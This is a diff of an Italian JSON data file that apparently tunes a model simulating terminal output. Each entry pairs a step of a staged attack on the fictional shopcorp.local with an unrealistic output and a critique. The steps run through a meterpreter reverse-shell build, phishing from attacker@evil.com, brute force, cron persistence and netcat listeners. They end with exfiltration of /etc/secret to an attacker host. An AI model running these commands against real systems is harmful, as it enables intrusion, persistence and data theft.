@@ -1,34 +1,148 @@
 [
   {
+    "fase": "ricognizione",
+    "comando": "nmap shopcorp.local",
+    "output_sbagliato": "Scan result: open ports 80, 443.",
+    "motivo": "L'output deve essere dettagliato come il vero nmap: includi banner iniziale, IP/hostname target, stato host, elenco porte trovate (con numero, protocollo, stato, servizio) e info di chiusura scan. Non usare frasi generiche o riassuntive.",
+    "timestamp": "2025-07-04T14:00:01.000000"
+  },
+  {
+    "fase": "ricognizione",
+    "comando": "theharvester -d shopcorp.local -b all",
+    "output_sbagliato": "Emails: mario.rossi@shopcorp.local, hosts: shopcorp.local",
+    "motivo": "L'output deve mostrare in modo ordinato tutte le email e host trovati, separando chiaramente le due sezioni, come farebbe theHarvester. Evita sintesi non realistiche.",
+    "timestamp": "2025-07-04T14:01:01.000000"
+  },
+  {
+    "fase": "ricognizione",
+    "comando": "whois shopcorp.local",
+    "output_sbagliato": "Domain info for shopcorp.local.",
+    "motivo": "L'output deve riportare campi reali tipici di whois (Domain Name, Registrar, Name Server, ecc.), non un riassunto generico.",
+    "timestamp": "2025-07-04T14:02:01.000000"
+  },
+
+  {
     "fase": "weaponization",
-    "comando": "`msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.10.20 LPORT=4444 -o payload.elf`",
-    "output_sbagliato": "`msfvenom -p linux/x86/meterpreter/reverse_tcp lhost=10.10.10.20 lport=4444 -o payload.elf`\n\n\nGenerated a 4096 byte exectable for the target architecture, but this p\nayload will not be a good native code since it was generated in a 64bits s\nystem...\n\nPayload size: 4096 bytes",
-    "output_corretto": "[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload\n[-] No arch selected, selecting arch: x86 from the payload\nNo encoder specified, outputting raw payload\nPayload size: 123 bytes\nSaved as: payload.elf",
-    "motivo": "L’output simulato contiene un warning generico che msfvenom normalmente non stampa. L’output reale dovrebbe riportare la dimensione reale del payload (es: ‘Payload size: 123 bytes’) e la conferma del salvataggio file (‘Saved as: payload.elf’).",
-    "timestamp": "2025-06-27T16:58:04.586646"
+    "comando": "msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.10.20 LPORT=4444 -f elf -o payload.elf",
+    "output_sbagliato": "Payload created.",
+    "motivo": "Mostra i passaggi tecnici tipici di msfvenom: selezione piattaforma, architettura, encoder (se assente), dimensione payload, conferma salvataggio file. Usa il formato vero, non solo una frase generica.",
+    "timestamp": "2025-07-04T14:04:01.000000"
   },
   {
     "fase": "weaponization",
-    "comando": "`msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.10.20 LPORT=4444 -o payload.elf`",
-    "output_sbagliato": "`msfvenom -p linux/x86/meterpreter/reverse_tcp lhost=10.10.10.20 lport=4444 -o payload.elf` \n```\n[-] No platform was selected, choosing Msf::Module::Platform::Linux from the target framework \n[-] No arch selected, selecting arch: x86 from the target framework \n-- \nPayload size: 444\n---\n\nAssembly:\nnop\nxor eax,eax\nmov al,0x5a\nxchg eax,edx\npush edx\npush 0x6d696e65\npush 0x73797374\npush 0x6d696e65\npush 0x2f6c",
-    "output_corretto": "[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload\n[-] No arch selected, selecting arch: x86 from the payload\nNo encoder specified, outputting raw payload\nPayload size: 123 bytes\nSaved as: payload.elf",
-    "motivo": "L'output generato include una sezione Assembly che msfvenom normalmente non mostra in output quando si esporta su file. Inoltre manca la riga di conferma \"Saved as: payload.elf\" e il payload size reale è tipicamente intorno ai 100-200 bytes per questo payload.",
-    "timestamp": "2025-06-27T22:58:05.943499"
+    "comando": "sudo python3 /opt/Empire/setup/setup_database.py",
+    "output_sbagliato": "Setting up DB...",
+    "motivo": "L'output deve confermare in modo chiaro e conciso che il setup del database è stato completato, come '[*] Database setup complete.'",
+    "timestamp": "2025-07-04T14:05:01.000000"
   },
+
   {
-    "fase": "weaponization",
-    "comando": "'msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.10.20 LPORT=4444 -f exe -o payload.exe'",
-    "output_sbagliato": "msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=10.10.10.20 lport=4444 -f exe -o payload.exe\n``` \n[-] lhost must be a valid IP address or a resolvable hostname, not '10.10.10.20'\n[-] lport must be a valid number, not '4444'\n```\nmsfvenom -p windows/x64/meterpreter/reverse_tcp lhost=10.10.10.18 lport=443 -f exe -o payload.exe\n``` \nPayload size: 4096 bytes\nFinal size of exe: 7168 bytes\nSaved as: payload.exe\n``` \n```",
-    "output_corretto": "[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload\n[-] No arch selected, selecting arch: x64 from the payload\nNo encoder specified, outputting raw payload\nPayload size: 386 bytes\nFinal size of exe: 73802 bytes\nSaved as: payload.exe",
-    "motivo": "L’output simulato mostra un errore su LHOST e LPORT anche se sono valori validi. In realtà, msfvenom accetta correttamente ‘10.10.10.20’ e ‘4444’.",
-    "timestamp": "2025-06-27T23:08:14.395131"
+    "fase": "delivery",
+    "comando": "scp payload.elf mario.rossi@shopcorp.local:/tmp",
+    "output_sbagliato": "File sent.",
+    "motivo": "L'output deve mostrare una barra di avanzamento simile a quella reale di scp, con nome file, percentuale, dimensione trasferita, velocità, tempo impiegato.",
+    "timestamp": "2025-07-04T14:06:01.000000"
   },
   {
     "fase": "delivery",
-    "comando": "`scp payload.elf mario.rossi@shopcorp.local:/tmp`",
-    "output_sbagliato": "`scp` \n`mismatched host port` \n`unknown host` \n`Permission denied, please try again.` \n`mario.rossi@shopcorp.local's password: ` \n`permission denied, the authenticating user not allowed to (connect to) login` \n`Permission denied, please try again.` \n`mario.rossi@shopcorp.local's password: ` \n`Connection closed' `  ```\n\nmario.rossi@` `  ```\n\n`'exit status 1' `  ```\n\n$  ```\n\n1  ```\n\n``` ``` ``` ``` ``` ``` ``` ``` ``` ``` ``` ``` ``` ``` ``` ``` ``` ``` ``` ``` ``` ``` ``` ``` ``` ``` ``` ```",
-    "output_corretto": "mario.rossi@shopcorp.local's password:\nPermission denied, please try again.\nmario.rossi@shopcorp.local's password:\nPermission denied, please try again.\nmario.rossi@shopcorp.local's password:\nPermission denied (publickey,password).",
-    "motivo": "L’output generato contiene messaggi di errore multipli e non realistici per una sola esecuzione di scp. Di solito, viene mostrato solo un errore per volta (es: “Permission denied”), e non si vedono stringhe come “exit status 1” stampate su schermo.",
-    "timestamp": "2025-06-27T23:39:24.247381"
+    "comando": "sendEmail -f attacker@evil.com -t mario.rossi@shopcorp.local -u 'Urgente!' -m 'Vedi allegato' -a payload.elf -s smtp.shopcorp.local:25",
+    "output_sbagliato": "Email delivered.",
+    "motivo": "L'output deve essere un messaggio di conferma essenziale e tipico, come 'Email sent successfully'. Evita messaggi generici.",
+    "timestamp": "2025-07-04T14:07:01.000000"
+  },
+  {
+    "fase": "delivery",
+    "comando": "smbclient //shopcorp.local/shared -U mario.rossi -c 'put payload.elf'",
+    "output_sbagliato": "File uploaded.",
+    "motivo": "L'output deve mostrare dettagli del trasferimento come fa smbclient (nome share, OS, nome file, velocità), non solo una frase generica.",
+    "timestamp": "2025-07-04T14:08:01.000000"
+  },
+
+  {
+    "fase": "exploit",
+    "comando": "msfconsole -q -x 'use exploit/multi/handler; set PAYLOAD linux/x86/meterpreter/reverse_tcp; set LHOST 10.10.10.20; set LPORT 4444; exploit'",
+    "output_sbagliato": "Exploit launched.",
+    "motivo": "L'output deve mostrare lo start dell'handler, invio stage/payload, apertura sessione e dettagli della connessione, come farebbe davvero Metasploit.",
+    "timestamp": "2025-07-04T14:09:01.000000"
+  },
+  {
+    "fase": "exploit",
+    "comando": "sqlmap -u 'http://shopcorp.local/login.php' --dump",
+    "output_sbagliato": "Dumping DB...",
+    "motivo": "L'output deve includere info dettagliate su database, tabelle, utenti e password trovati, simulando davvero il dump di sqlmap.",
+    "timestamp": "2025-07-04T14:10:01.000000"
+  },
+  {
+    "fase": "exploit",
+    "comando": "hydra -l mario.rossi -P rockyou.txt ssh://shopcorp.local",
+    "output_sbagliato": "Trying passwords...",
+    "motivo": "L'output deve mostrare, come fa hydra, il servizio, host, username e la password trovata, in formato tabellare o ben strutturato.",
+    "timestamp": "2025-07-04T14:11:01.000000"
+  },
+
+  {
+    "fase": "installation",
+    "comando": "ssh mario.rossi@shopcorp.local",
+    "output_sbagliato": "Connected.",
+    "motivo": "L'output deve mostrare la richiesta password, eventuali messaggi di benvenuto (motd), il prompt della shell, come una vera sessione SSH.",
+    "timestamp": "2025-07-04T14:12:01.000000"
+  },
+  {
+    "fase": "installation",
+    "comando": "(crontab -l; echo '@reboot /tmp/payload.elf') | crontab -",
+    "output_sbagliato": "Scheduled.",
+    "motivo": "L'output deve simulare la risposta di crontab, ad esempio 'crontab: installing new crontab', non solo una frase generica.",
+    "timestamp": "2025-07-04T14:13:01.000000"
+  },
+  {
+    "fase": "installation",
+    "comando": "sudo systemctl enable payload.service",
+    "output_sbagliato": "Service enabled.",
+    "motivo": "L'output deve mostrare la creazione del symlink come nel messaggio reale di systemctl (ad esempio: Created symlink ...).",
+    "timestamp": "2025-07-04T14:14:01.000000"
+  },
+
+  {
+    "fase": "command_and_control",
+    "comando": "nc -lvp 4444",
+    "output_sbagliato": "Listening...",
+    "motivo": "L'output deve includere 'Listening on', eventuale messaggio di connessione ricevuta e identificazione sistema remoto, come farebbe netcat.",
+    "timestamp": "2025-07-04T14:15:01.000000"
+  },
+  {
+    "fase": "command_and_control",
+    "comando": "ncat --ssl -l 5555 --keep-open",
+    "output_sbagliato": "Ncat listening...",
+    "motivo": "L'output deve mostrare la porta, la conferma di ascolto e la ricezione di connessioni, in stile reale di ncat.",
+    "timestamp": "2025-07-04T14:16:01.000000"
+  },
+  {
+    "fase": "command_and_control",
+    "comando": "ssh -R 2222:localhost:22 attacker@10.10.10.20",
+    "output_sbagliato": "Tunnel established.",
+    "motivo": "L'output deve specificare che il tunnel reverse è attivo, indicando le porte coinvolte e la destinazione, non solo una frase sintetica.",
+    "timestamp": "2025-07-04T14:17:01.000000"
+  },
+
+  {
+    "fase": "actions_on_objectives",
+    "comando": "tar czf secrets.tar.gz /etc/secret",
+    "output_sbagliato": "Archive created.",
+    "motivo": "L'output deve mostrare i file archiviati e l'eventuale rimozione dei path assoluti (tipico di tar), non solo la conferma generica.",
+    "timestamp": "2025-07-04T14:18:01.000000"
+  },
+  {
+    "fase": "actions_on_objectives",
+    "comando": "rclone copy secrets.tar.gz attacker@10.10.10.20:/home/attacker/",
+    "output_sbagliato": "File copied.",
+    "motivo": "L'output deve mostrare la barra di avanzamento e i dettagli di trasferimento, come il vero rclone.",
+    "timestamp": "2025-07-04T14:19:01.000000"
+  },
+  {
+    "fase": "actions_on_objectives",
+    "comando": "scp secrets.tar.gz attacker@10.10.10.20:/home/attacker/",
+    "output_sbagliato": "Transfer complete.",
+    "motivo": "L'output deve simulare la barra di avanzamento reale di scp, con nome file, percentuale, velocità, tempo, non solo una frase finale.",
+    "timestamp": "2025-07-04T14:20:01.000000"
   }
 ]
